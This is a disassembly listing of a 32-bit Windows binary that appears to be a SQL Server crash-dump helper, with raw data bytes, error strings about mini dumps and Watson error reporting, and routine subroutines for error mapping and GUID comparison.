                db  41h ; A
                db 0DCh
                db  76h ; v
                db    6
                db 71h, 0DBh, 1
                db 0BCh
                db 20h, 0D2h, 98h
                db  2Ah ; *
                db 10h, 0D5h, 0EFh
                db  89h
                db 85h, 0B1h, 71h
                db  1Fh
                db 0B5h, 0B6h, 6
                db 0A5h
                db 0E4h, 0BFh, 9Fh
                db  33h ; 3
                db 0D4h, 0B8h, 0E8h
                db 0A2h
                db 0C9h, 7, 78h
                db  34h ; 4
                db 0F9h, 0, 0Fh
                db  8Eh
                db 0A8h, 9, 96h
                db  18h
                db 98h, 0Eh, 0E1h
                db 0BBh
                db 0Dh, 6Ah, 7Fh
                db  2Dh ; -
                db 3Dh, 6Dh, 8
                db  97h
                db 6Ch, 64h, 91h
                db    1
                db 5Ch, 63h, 0E6h
                db 0F4h
                db 51h, 2 dup(6Bh)
                db  62h ; b
                db 61h, 6Ch, 1Ch
                db 0D8h
                db 30h, 65h, 85h
                db  4Eh ; N
                align 2
                dw 0F262h
                db 0EDh
                db 95h, 6, 6Ch
                db  7Bh ; {
                db 0A5h, 1, 1Bh
                db 0C1h
                db 0F4h, 8, 82h
                db  57h ; W
                db 0C4h, 0Fh, 0F5h
                db 0C6h
                db 0D9h, 0B0h, 65h
                db  50h ; P
                db 0E9h, 0B7h, 12h
                db 0EAh
                db 0B8h, 0BEh, 8Bh
                db  7Ch ; |
                db 88h, 0B9h, 0FCh
                db 0DFh
                db 1Dh, 0DDh, 62h
                db  49h ; I
                db 2Dh, 0DAh, 15h
                db 0F3h
                db 7Ch, 0D3h, 8Ch
                db  65h ; e
                db 4Ch, 0D4h, 0FBh
                db  58h ; X
                db 61h, 0B2h, 4Dh
                db 0CEh
                db 51h, 0B5h, 3Ah
                db  74h ; t
                align 2
                dw 0A3BCh
                db 0E2h
                db 30h, 0BBh, 0D4h
                db  41h ; A
                db 0A5h, 0DFh, 4Ah
                db 0D7h
                db 95h, 0D8h, 3Dh
                db  6Dh ; m
                db 0C4h, 0D1h, 0A4h
                db 0FBh
                db 0F4h, 0D6h, 0D3h
                db  6Ah ; j
                db 0E9h, 69h, 43h
                db 0FCh
                db 0D9h, 6Eh, 34h
                db  46h ; F
                db 88h, 67h, 0ADh
                db 0D0h
                db 0B8h, 60h, 0DAh
                db  73h ; s
                db 2Dh, 4, 44h
                db 0E5h
                db 1Dh, 3, 33h
                db  5Fh ; _
                db 4Ch, 0Ah, 0AAh
                db 0C9h
                db 7Ch, 0Dh, 0DDh
                db  3Ch ; <
                db 71h, 5, 50h
                db 0AAh
                db 41h, 2, 27h
                db  10h
                db 10h, 0Bh, 0BEh
                db  86h
                db 20h, 0Ch, 0C9h
                db  25h ; %
                db 0B5h, 68h, 57h
                db 0B3h
                db 85h, 6Fh, 20h
                db    9
                db 0D4h, 66h, 0B9h
                db  9Fh
                db 0E4h, 61h, 0CEh
                db  0Eh
                db 0F9h, 0DEh, 5Eh
                db  98h
                db 0C9h, 0D9h, 29h
                db  22h ; "
                db 98h, 0D0h, 0B0h
                db 0B4h
                db 0A8h, 0D7h, 0C7h
                db  17h
                db 3Dh, 0B3h, 59h
                db  81h
                db 0Dh, 0B4h, 2Eh
                db  3Bh ; ;
                db 5Ch, 0BDh, 0B7h
                db 0ADh
                db 6Ch, 0BAh, 0C0h
                db  20h
                db 83h, 0B8h, 0EDh
                db 0B6h
                db 0B3h, 0BFh, 9Ah
                db  0Ch
                db 0E2h, 0B6h, 3
                db  9Ah
                db 0D2h, 0B1h, 74h
                db  39h ; 9
                db 47h, 0D5h, 0EAh
                db 0AFh
                db 77h, 0D2h, 9Dh
                db  15h
                db 26h, 0DBh, 4
                db  83h
                db 16h, 0DCh, 73h
                db  12h
                db 0Bh, 63h, 0E3h
                db  84h
                db 3Bh, 64h, 94h
                db  3Eh ; >
                db 6Ah, 6Dh, 0Dh
                db 0A8h
                db 5Ah, 6Ah, 7Ah
                db  0Bh
                db 0CFh, 0Eh, 0E4h
                db  9Dh
                db 0FFh, 9, 93h
                db  27h ; '
                db 0AEh, 0, 0Ah
                db 0B1h
                db 9Eh, 7, 7Dh
                db  44h ; D
                db 93h, 0Fh, 0F0h
                db 0D2h
                db 0A3h, 8, 87h
                db  68h ; h
                db 0F2h, 1, 1Eh
                db 0FEh
                db 0C2h, 6, 69h
                db  5Dh ; ]
                db 57h, 62h, 0F7h
; ---------------------------------------------------------------------------
                retf
; ---------------------------------------------------------------------------
                db 67h, 65h, 80h
                db  71h ; q
                db 36h, 6Ch, 19h
                db 0E7h
                db 6, 6Bh, 6Eh
                db  76h ; v
                db 1Bh, 0D4h, 0FEh
                db 0E0h
                db 2Bh, 0D3h, 89h
                db  5Ah ; Z
                db 7Ah, 0DAh, 10h
                db 0CCh
                db 4Ah, 0DDh, 67h
                db  6Fh ; o
                db 0DFh, 0B9h, 0F9h
                db 0F9h
                db 0EFh, 0BEh, 8Eh
                db  43h ; C
                db 0BEh, 0B7h, 17h
                db 0D5h
                db 8Eh, 0B0h, 60h
                db 0E8h
                db 0A3h, 2 dup(0D6h)
                db  7Eh ; ~
                db 93h, 0D1h, 0A1h
                db 0C4h
                db 0C2h, 0D8h, 38h
                db  52h ; R
                db 0F2h, 0DFh, 4Fh
                db 0F1h
                db 67h, 0BBh, 0D1h
                db  67h ; g
                db 57h, 0BCh, 0A6h
                db 0DDh
                db 6, 0B5h, 3Fh
                db  4Bh ; K
                db 36h, 0B2h, 48h
                db 0DAh
                db 2Bh, 0Dh, 0D8h
                db  4Ch ; L
                db 1Bh, 0Ah, 0AFh
                db 0F6h
                db 4Ah, 3, 36h
                db  60h ; `
                db 7Ah, 4, 41h
; ---------------------------------------------------------------------------
                retn
; ---------------------------------------------------------------------------
                db 0EFh, 60h, 0DFh
                db  55h ; U
                db 0DFh, 67h, 0A8h
                db 0EFh
                db 8Eh, 6Eh, 31h
                db  79h ; y
; ---------------------------------------------------------------------------
                mov     esi, 0B38C4669h
                popa
                retf
; ---------------------------------------------------------------------------
                db  1Ah
                db 83h, 66h, 0BCh
                db 0A0h
                db 0D2h, 6Fh, 25h
                db  36h ; 6
                db 0E2h, 68h, 52h
                db  95h
                db 77h, 0Ch, 0CCh
                db    3
                db 47h, 0Bh, 0BBh
                db 0B9h
                db 16h, 2, 22h
                db  2Fh ; /
                db 26h, 5, 55h
                db 0BEh
                db 3Bh, 0BAh, 0C5h
                db  28h ; (
                db 0Bh, 0BDh, 0B2h
                db  92h
                db 5Ah, 0B4h, 2Bh
                db    4
                db 6Ah, 0B3h, 5Ch
                db 0A7h
                db 0FFh, 0D7h, 0C2h
                db  31h ; 1
                db 0CFh, 0D0h, 0B5h
                db  8Bh
                db 9Eh, 0D9h, 2Ch
                db  1Dh
                db 0AEh, 0DEh, 5Bh
                db 0B0h
                db 0C2h, 64h, 9Bh
                db  26h ; &
                db 0F2h, 63h, 0ECh
                db  9Ch
                db 0A3h, 6Ah, 75h
                db  0Ah
                db 93h, 6Dh, 2
                db 0A9h
                db 6, 9, 9Ch
                db  3Fh ; ?
                db 36h, 0Eh, 0EBh
                db  85h
                db 67h, 7, 72h
                db  13h
                db 57h, 0, 5
                db  82h
                db 4Ah, 0BFh, 95h
                db  14h
                db 7Ah, 0B8h, 0E2h
                db 0AEh
                db 2Bh, 0B1h, 7Bh
                db  38h ; 8
                db 1Bh, 0B6h, 0Ch
                db  9Bh
                db 8Eh, 0D2h, 92h
                db  0Dh
                db 0BEh, 0D5h, 0E5h
                db 0B7h
                db 0EFh, 0DCh, 7Ch
                db  21h ; !
                db 0DFh, 0DBh, 0Bh
                db 0D4h
                db 0D2h, 0D3h, 86h
                db  42h ; B
                db 0E2h, 0D4h, 0F1h
                db 0F8h
                db 0B3h, 0DDh, 68h
                db  6Eh ; n
                db 83h, 0DAh, 1Fh
                db 0CDh
                db 16h, 0BEh, 81h
                db  5Bh ; [
                db 26h, 0B9h, 0F6h
                db 0E1h
                db 77h, 0B0h, 6Fh
                db  77h ; w
                db 47h, 0B7h, 18h
                db 0E6h
                db 5Ah, 8, 88h
                db  70h ; p
                db 6Ah, 0Fh, 0FFh
                db 0CAh
                db 3Bh, 6, 66h
                db  5Ch ; \
                db 0Bh, 1, 11h
                db 0FFh
                db 9Eh, 65h, 8Fh
                db  69h ; i
                db 0AEh, 62h, 0F8h
                db 0D3h
; ---------------------------------------------------------------------------
                jmp     fword ptr [ebx+61h]
; ---------------------------------------------------------------------------
                db  45h ; E
                db 0CFh, 6Ch, 16h
                db  78h ; x
                db 0E2h, 0Ah, 0A0h
                db 0EEh
; ---------------------------------------------------------------------------
                ror     byte ptr ds:48354D7h, cl
                dec     esi
                retn    3B3h
; ---------------------------------------------------------------------------
                db 39h
                db  61h ; a
                db 26h, 67h, 0A7h
                db 0F7h
                db 16h, 60h, 0D0h
                db  4Dh ; M
                db 47h, 69h, 49h
                db 0DBh
                db 77h, 6Eh, 3Eh
                db  4Ah ; J
                db 6Ah, 0D1h, 0AEh
                db 0DCh
                db 5Ah, 0D6h, 0D9h
                db  66h ; f
                db 0Bh, 0DFh, 40h
                db 0F0h
                db 3Bh, 0D8h, 37h
                db  53h ; S
                db 0AEh, 0BCh, 0A9h
                db 0C5h
                db 9Eh, 0BBh, 0DEh
                db  7Fh ; 
                db 0CFh, 0B2h, 47h
                db 0E9h
                db 0FFh, 0B5h, 30h
                db  1Ch
                db 0F2h, 2 dup(0BDh)
                db  8Ah
                db 0C2h, 0BAh, 0CAh
                db  30h ; 0
                db 93h, 0B3h, 53h
                db 0A6h
                db 0A3h, 0B4h, 24h
                db    5
                db 36h, 0D0h, 0BAh
                db  93h
                db 6, 0D7h, 0CDh
                db  29h ; )
                db 57h, 0DEh, 54h
                db 0BFh
                db 67h, 0D9h, 23h
                db  2Eh ; .
                db 7Ah, 66h, 0B3h
                db 0B8h
                db 4Ah, 61h, 0C4h
                db    2
                db 1Bh, 68h, 5Dh
                db  94h
                db 2Bh, 6Fh, 2Ah
                db  37h ; 7
                db 0BEh, 0Bh, 0B4h
                db 0A1h
                db 8Eh, 0Ch, 0C3h
                db  1Bh
                db 0DFh, 5, 5Ah
                db  8Dh
                db 0EFh, 2, 2Dh
aQueryworkingse db 'QueryWorkingSetEx',0
                align 4
aPsapiDll_0:
                text "UTF-16LE", 'psapi.dll',0
                dd 0
aSqldumperExe_0:
                text "UTF-16LE", 'SQLDUMPER.EXE',0
; ---------------------------------------------------------------------------
                les     ecx, [esi]
                retn
; ---------------------------------------------------------------------------
                db 1Bh
                dd 49A48591h, 0B44FA29Eh, 0E6B57640h, 20001000h, 10022E8h
                dd 20000002h, 1002330h, 20000004h, 1002380h, 20000008h
                dd 10023D8h, 20000010h, 1002428h, 20000020h, 1002480h
                dd 20000040h, 10024D0h, 20000080h, 1002528h, 20000100h
                dd 1002588h, 20000200h, 10025D8h, 20000400h, 1002628h
                dd 20000800h, 1002680h, 20002000h, 10026E0h, 20008000h
                dd 1002770h, 720045h, 6F0072h, 200072h, 20002Dh, 750044h
                dd 70006Dh, 6E0069h, 200067h, 720070h, 63006Fh, 730065h
                dd 200073h, 610077h, 200073h, 6F006Eh, 200074h, 740073h
                dd 720061h, 650074h, 200064h, 72006Fh, 740020h, 720065h
                dd 69006Dh, 61006Eh, 650074h, 200064h, 720070h, 6D0065h
                dd 740061h, 720075h, 6C0065h, 2E0079h, 0A000Dh, 2 dup(0)
aExternalDumpPr:
                text "UTF-16LE", 'External dump process returned no errors.',0Dh,0Ah,0
aExternalDumpPr_0:
                text "UTF-16LE", 'External dump process return code 0x%x.',0Dh,0Ah,0
                align 10h
aErrorInputPara:
                text "UTF-16LE", 'Error - Input parameters invalid.',0Dh,0Ah,0
aErrorFailedToC:
                text "UTF-16LE", 'Error - Failed to create dump file.',0Dh,0Ah,0
                align 8
aErrorFailedToC_0:
                text "UTF-16LE", 'Error - Failed to create manifest file.',0Dh,0Ah,0
                align 10h
aErrorFailedToO:
                text "UTF-16LE", 'Error - Failed to open debug process.',0Dh,0Ah,0
aErrorFailedWhi:
                text "UTF-16LE", 'Error - Failed while writing mini dump.',0Dh,0Ah,0
                align 8
aErrorFailedRea:
                text "UTF-16LE", 'Error - Failed reading registry keys.',0Dh,0Ah,0
aErrorFailedToS:
                text "UTF-16LE", 'Error - Failed to start Watson process.',0Dh,0Ah,0
                align 10h
aErrorFailedWri:
                text "UTF-16LE", 'Error - Failed writing the Watson manifest.',0Dh,0Ah
                text "UTF-16LE", 0
                align 10h
aErrorVersionMi:
                text "UTF-16LE", 'Error - Version mismatch detected.',0Dh,0Ah,0
                align 10h
aErrorRemoteMem:
                text "UTF-16LE", 'Error - Remote memory read failed.',0Dh,0Ah,0
                align 10h
aErrorRemoteMem_0:
                text "UTF-16LE", 'Error - Remote memory failed checksum.',0Dh,0Ah,0
                align 8
aErrorRemoteMem_1:
                text "UTF-16LE", 'Error - Remote memory failed sanity check.',0Dh,0Ah
                text "UTF-16LE", 0
                align 8
aTheErrorInform:
                text "UTF-16LE", 'The error information has been submitted to Watson '
                text "UTF-16LE", 'error reporting.',0Dh,0Ah,0
                align 8
aErrorSomeOfThe:
                text "UTF-16LE", 'Error - some of the dump files were not generated o'
                text "UTF-16LE", 'n remote nodes.',0Dh,0Ah,0
                align 8
                dd 1008C80h, 1008CE0h, 1008D00h, 100A000h, 1008A70h, 1008A50h
                dd 1008970h, 1008E50h, 1008AF0h, 1008950h, 1009780h, 10097E0h
                dd 1008990h, 1008A10h, 1008AD0h, 1008AB0h, 1008BA0h, 1008BC0h
                dd 1008B80h, 1008B20h, 1008B40h, 1008B60h, 10089F0h, 1009E10h
                dd 1008C40h, 1008C20h, 1008BE0h, 1008C00h, 1008A30h, 1009240h
                dd 1009840h, 6C0025h, 200073h, 6C0025h, 200064h, 200030h
                dd 3A0030h, 200030h, 700025h, 0
aTimeoutWaiting:
                text "UTF-16LE", 'Timeout waiting for external dump process %d.',0Dh,0Ah
                text "UTF-16LE", 0
aExternalDumpPr_1:
                text "UTF-16LE", 'External dump process not executed.',0Dh,0Ah,0
                dd 100A228h, 100A244h, 100A266h, 100A2A3h, 100A2BFh, 100A2E5h
                dd 100A354h, 100A367h, 100A3CDh, 100A3E0h, 100A3E8h, 48h
                dd 0Eh dup(0)
                db 88h, 0C0h
                dw 100h
                dd 1002A80h, 8, 53445352h, 61CF21CDh, 4F21D402h, 35AA2796h
                dd 6799240Ch, 1, 44737444h, 67756265h, 74736F48h, 6264702Eh
                dd 16h dup(0)
                dd 100C070h, 1002A48h, 2 dup(0)
                dd 1, 1002A58h, 1002A60h, 0
                dd 100C070h, 2 dup(0)
                dd 0FFFFFFFFh, 0
                dd 40h, 1002A48h, 0
                dd 5AB7h, 0A560h, 0A59Fh, 0A5BFh, 0A5DFh, 0A5FFh, 0A627h
                dd 0A650h, 5 dup(0)
                dd 0B80C6A00h, 100A5BFh, 2EEAE8h, 104D8B00h, 0A75C985h
                dd 4003B8h, 8BE980h, 0C0330000h, 7000EBBh, 89286A80h, 0EC5D8901h
                dd 89E84589h, 6DE8FC45h, 8B00002Ch, 0F68559F0h, 66831974h
                dd 66A0004h, 8D59C033h, 0ABF3087Eh, 0C7204688h, 16B006h
                dd 3302EB01h, 0FC4D83F6h, 8310EBFFh, 0B8FFFC4Dh, 1002B1Dh
                dd 0EC5D8BC3h, 85E8758Bh, 8B3474F6h, 4E8D0845h, 24468904h
                dd 0B04E8h, 85D88B00h, 330478DBh, 75DB85DBh, 1075FF11h
                dd 75FF068Bh, 10FF560Ch, 0DB85D88Bh, 68B0974h, 0CE8B016Ah
                dd 8B1450FFh, 2EBFE8C3h, 0CC20000h, 0CCCCCC00h, 0FF8BCCCCh
; ---------------------------------------------------------------------------
                push    ebp
                mov     ebp, esp
                cmp     dword ptr [ebp+8], 0
                jnz     short loc_137DC
                push    dword ptr [ebp+10h]
                push    dword ptr [ebp+0Ch]
                push    0
                call    sub_156ED
                jmp     short loc_137F2
; ---------------------------------------------------------------------------

loc_137DC:                              ; CODE XREF: CODE:000137CB↑j
                mov     eax, [ebp+10h]
                test    eax, eax
                jnz     short loc_137EA
                mov     eax, 80004003h
                jmp     short loc_137F2
; ---------------------------------------------------------------------------

loc_137EA:                              ; CODE XREF: CODE:000137E1↑j
                and     dword ptr [eax], 0
                mov     eax, 80040110h

loc_137F2:                              ; CODE XREF: CODE:000137DA↑j
                                        ; CODE:000137E8↑j
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                retn    4
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                xor     eax, eax
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------
                xor     eax, eax
                retn
; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_13813       proc near

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0
                push    [ebp+arg_0]
                push    66h ; 'f'
                push    dword ptr ds:100C364h
                call    sub_13F51
                pop     ebp
                retn    4
sub_13813       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_13833       proc near               ; CODE XREF: sub_14403+62↓p
                                        ; sub_157D1+11↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_0]
                mov     eax, [ecx]
                mov     edx, [ebp+arg_4]
                cmp     eax, [edx]
                jnz     short loc_13861
                mov     eax, [ecx+4]
                cmp     eax, [edx+4]
                jnz     short loc_13861
                mov     eax, [ecx+8]
                cmp     eax, [edx+8]
                jnz     short loc_13861
                mov     eax, [ecx+0Ch]
                cmp     eax, [edx+0Ch]
                jnz     short loc_13861
                xor     eax, eax
                inc     eax
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_13861:                              ; CODE XREF: sub_13833+F↑j
                                        ; sub_13833+17↑j ...
                xor     eax, eax
                pop     ebp
                retn
sub_13833       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1386A       proc near               ; CODE XREF: CODE:00016113↓p

arg_0           = dword ptr  8
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                mov     ecx, [ebp+arg_8]
                push    esi
                lea     edx, [ecx+2]
                xor     esi, esi

loc_13879:                              ; CODE XREF: sub_1386A+18↓j
                mov     ax, [ecx]
                add     ecx, 2
                cmp     ax, si
                jnz     short loc_13879
                sub     ecx, edx
                sar     ecx, 1
                jnz     short loc_138DD
                lea     eax, [ebp+arg_C]
                push    eax
                push    65h ; 'e'
                push    [ebp+arg_0]
                mov     [ebp+arg_C], esi
                mov     [ebp+arg_8], esi
                call    sub_16DA9
                add     esp, 0Ch
                test    eax, eax
                jz      short loc_138C9
                lea     eax, [ebp+arg_8]
                push    eax
                push    66h ; 'f'
                push    [ebp+arg_0]
                call    sub_16DA9
                add     esp, 0Ch
                test    eax, eax
                jz      short loc_138C9
                push    40h ; '@'
                push    [ebp+arg_C]
                push    [ebp+arg_8]
                push    esi
                call    dword ptr ds:10012A0h

loc_138C9:                              ; CODE XREF: sub_1386A+39↑j
                                        ; sub_1386A+4E↑j
                push    [ebp+arg_8]
                mov     esi, ds:1001244h
                call    esi
                push    [ebp+arg_C]
                call    esi
                xor     eax, eax
                jmp     short loc_1390F
; ---------------------------------------------------------------------------

loc_138DD:                              ; CODE XREF: sub_1386A+1E↑j
                push    7
                push    10016A0h
                push    [ebp+arg_8]
                call    dword ptr ds:10011A4h
                add     esp, 0Ch
                test    eax, eax
                jnz     short loc_138FB
                mov     byte ptr ds:100C360h, 1

loc_138FB:                              ; CODE XREF: sub_1386A+88↑j
                push    esi
                call    sub_14D5F
                pop     ecx
                push    [ebp+arg_C]
                mov     ecx, 100C320h
                call    sub_15086

loc_1390F:                              ; CODE XREF: sub_1386A+71↑j
                pop     esi
                leave
                retn    10h
sub_1386A       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_13919       proc near               ; CODE XREF: sub_14403+CC↓p
                mov     edi, edi
                push    esi
                mov     esi, ecx
                jmp     short loc_1392E
; ---------------------------------------------------------------------------

loc_13920:                              ; CODE XREF: sub_13919+18↓j
                mov     ecx, [esi]
                mov     eax, [ecx]
                push    ecx
                mov     [esi], eax
                call    dword ptr ds:10011B0h
                pop     ecx

loc_1392E:                              ; CODE XREF: sub_13919+5↑j
                cmp     dword ptr [esi], 0
                jnz     short loc_13920
                pop     esi
                retn
sub_13919       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: noreturn bp-based frame

sub_1393A       proc near               ; CODE XREF: sub_13959:loc_1397E↓p
                                        ; sub_15D09+20↓p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                mov     [ebp+arg_0], eax
                push    100A94Ch
                lea     eax, [ebp+arg_0]
                push    eax
                call    sub_165C0
sub_1393A       endp

; ---------------------------------------------------------------------------
                db 6 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_13959       proc near               ; CODE XREF: sub_13B58+9F↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                test    eax, eax
                jz      short loc_13991
                cmp     eax, 0Ch
                jz      short loc_1398A
                cmp     eax, 16h
                jz      short loc_13983
                cmp     eax, 22h ; '"'
                jz      short loc_13983
                cmp     eax, 50h ; 'P'
                jz      short loc_13991
                push    80004005h

loc_1397E:                              ; CODE XREF: sub_13959+2F↓j
                                        ; sub_13959+36↓j
                call    sub_1393A
; ---------------------------------------------------------------------------

loc_13983:                              ; CODE XREF: sub_13959+14↑j
                                        ; sub_13959+19↑j
                push    80070057h
                jmp     short loc_1397E
; ---------------------------------------------------------------------------

loc_1398A:                              ; CODE XREF: sub_13959+F↑j
                push    8007000Eh
                jmp     short loc_1397E
; ---------------------------------------------------------------------------

loc_13991:                              ; CODE XREF: sub_13959+A↑j
                                        ; sub_13959+1E↑j
                pop     ebp
                retn
sub_13959       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================


sub_13998       proc near               ; CODE XREF: sub_13E6C+25↓p
                                        ; sub_14291+8↓p ...
                mov     edi, edi
                push    esi
                xor     esi, esi
                push    esi
                push    ecx
                call    dword ptr ds:10010BCh
                test    eax, eax
                jnz     short loc_139C1
                call    dword ptr ds:1001144h
                mov     esi, eax
                test    esi, esi
                jle     short loc_139C1
                and     esi, 0FFFFh
                or      esi, 80070000h

loc_139C1:                              ; CODE XREF: sub_13998+F↑j
                                        ; sub_13998+1B↑j
                mov     eax, esi
                pop     esi
                retn
sub_13998       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)
; ---------------------------------------------------------------------------

loc_139CA:                              ; CODE XREF: CODE:0001B1F2↓j
                push    dword ptr [ecx]
                call    dword ptr ds:1001244h
                retn
; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_139D8       proc near               ; CODE XREF: sub_14103+25↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, ecx
                cmp     dword ptr [esi], 0
                jz      short loc_13A1B
                push    10013ACh
                call    dword ptr ds:1001064h
                test    eax, eax
                jz      short loc_13A29
                push    10013C8h
                push    eax
                call    dword ptr ds:100115Ch
                test    eax, eax
                jz      short loc_13A29
                push    0
                push    dword ptr [esi]
                push    [ebp+arg_10]
                push    [ebp+arg_C]
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    eax
                jmp     short loc_13A2C
; ---------------------------------------------------------------------------

loc_13A1B:                              ; CODE XREF: sub_139D8+B↑j
                cmp     dword ptr [esi+4], 0
                jz      short loc_13A29
                pop     esi
                pop     ebp
                jmp     dword ptr ds:1001000h
; ---------------------------------------------------------------------------

loc_13A29:                              ; CODE XREF: sub_139D8+1A↑j
                                        ; sub_139D8+2A↑j ...
                xor     eax, eax
                inc     eax

loc_13A2C:                              ; CODE XREF: sub_139D8+41↑j
                pop     esi
                pop     ebp
                retn    14h
sub_139D8       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_13A36       proc near               ; CODE XREF: sub_14EB6+10↓p

var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ecx
                push    ebx
                mov     ebx, [ebp+arg_0]
                test    ebx, ebx
                jnz     short loc_13A4C
                mov     eax, 80070057h
                jmp     short loc_13ABD
; ---------------------------------------------------------------------------

loc_13A4C:                              ; CODE XREF: sub_13A36+D↑j
                mov     edx, [ebx+8]
                push    esi
                xor     eax, eax
                push    edi
                mov     [ebp+var_4], edx
                cmp     edx, [ebx+0Ch]
                jnb     short loc_13AAB

loc_13A5B:                              ; CODE XREF: sub_13A36+6F↓j
                mov     esi, [edx]
                mov     [ebp+var_8], esi
                test    esi, esi
                jz      short loc_13A9C
                cmp     [ebp+arg_8], 0
                jz      short loc_13A7E
                mov     edi, [esi]
                mov     esi, [ebp+arg_8]
                push    4
                xor     ebx, ebx
                mov     ebx, [ebp+arg_0]
                pop     ecx
                repe cmpsd
                jnz     short loc_13A9C
                mov     esi, [ebp+var_8]

loc_13A7E:                              ; CODE XREF: sub_13A36+32↑j
                push    1
                call    dword ptr [esi+4]
                test    eax, eax
                js      short loc_13ABB
                push    1
                call    dword ptr [esi+1Ch]
                push    eax
                push    dword ptr [esi]
                call    dword ptr ds:100102Ch
                test    eax, eax
                js      short loc_13ABB
                mov     edx, [ebp+var_4]

loc_13A9C:                              ; CODE XREF: sub_13A36+2C↑j
                                        ; sub_13A36+43↑j
                add     edx, 4
                mov     [ebp+var_4], edx
                cmp     edx, [ebx+0Ch]
                jb      short loc_13A5B
                test    eax, eax
                js      short loc_13ABB

loc_13AAB:                              ; CODE XREF: sub_13A36+23↑j
                cmp     [ebp+arg_4], 0
                jz      short loc_13ABB
                push    0
                push    dword ptr [ebx+4]
                call    sub_13B58

loc_13ABB:                              ; CODE XREF: sub_13A36+4F↑j
                                        ; sub_13A36+61↑j ...
                pop     edi
                pop     esi

loc_13ABD:                              ; CODE XREF: sub_13A36+14↑j
                pop     ebx
                leave
                retn    0Ch
sub_13A36       endp

; ---------------------------------------------------------------------------
                db 5 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_13AC7       proc near               ; CODE XREF: sub_14EEB+1F↓p

var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ecx
                push    ebx
                mov     ebx, [ebp+arg_0]
                test    ebx, ebx
                jnz     short loc_13ADD
                mov     eax, 80070057h
                jmp     short loc_13B4E
; ---------------------------------------------------------------------------

loc_13ADD:                              ; CODE XREF: sub_13AC7+D↑j
                mov     edx, [ebx+8]
                push    esi
                xor     eax, eax
                push    edi
                mov     [ebp+var_4], edx
                cmp     edx, [ebx+0Ch]
                jnb     short loc_13B3C

loc_13AEC:                              ; CODE XREF: sub_13AC7+6F↓j
                mov     esi, [edx]
                mov     [ebp+var_8], esi
                test    esi, esi
                jz      short loc_13B2D
                cmp     [ebp+arg_8], 0
                jz      short loc_13B0F
                mov     edi, [esi]
                mov     esi, [ebp+arg_8]
                push    4
                xor     ebx, ebx
                mov     ebx, [ebp+arg_0]
                pop     ecx
                repe cmpsd
                jnz     short loc_13B2D
                mov     esi, [ebp+var_8]

loc_13B0F:                              ; CODE XREF: sub_13AC7+32↑j
                push    0
                call    dword ptr [esi+1Ch]
                push    eax
                push    dword ptr [esi]
                call    dword ptr ds:100102Ch
                test    eax, eax
                js      short loc_13B4C
                push    0
                call    dword ptr [esi+4]
                test    eax, eax
                js      short loc_13B4C
                mov     edx, [ebp+var_4]

loc_13B2D:                              ; CODE XREF: sub_13AC7+2C↑j
                                        ; sub_13AC7+43↑j
                add     edx, 4
                mov     [ebp+var_4], edx
                cmp     edx, [ebx+0Ch]
                jb      short loc_13AEC
                test    eax, eax
                js      short loc_13B4C

loc_13B3C:                              ; CODE XREF: sub_13AC7+23↑j
                cmp     [ebp+arg_4], 0
                jz      short loc_13B4C
                push    0
                push    dword ptr [ebx+4]
                call    sub_13CF0

loc_13B4C:                              ; CODE XREF: sub_13AC7+58↑j
                                        ; sub_13AC7+61↑j ...
                pop     edi
                pop     esi

loc_13B4E:                              ; CODE XREF: sub_13AC7+14↑j
                pop     ebx
                leave
                retn    0Ch
sub_13AC7       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_13B58       proc near               ; CODE XREF: sub_13A36+80↑p

var_21C         = dword ptr -21Ch
var_218         = dword ptr -218h
var_214         = dword ptr -214h
var_20D         = byte ptr -20Dh
var_20C         = word ptr -20Ch
var_6           = word ptr -6
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

